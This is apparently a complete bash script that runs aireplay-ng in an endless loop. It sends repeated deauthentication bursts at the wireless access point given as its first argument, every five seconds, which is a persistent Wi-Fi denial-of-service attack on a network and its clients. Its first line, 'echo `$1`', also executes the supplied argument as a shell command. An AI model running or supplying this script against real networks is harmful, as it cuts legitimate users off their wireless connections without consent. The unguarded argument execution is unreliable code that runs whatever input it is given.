#!/bin/bash

echo `$1`
while true
do
	aireplay-ng -0 10 -a $1 wlp6s0
	sleep 5
	echo Waiting !!!
done

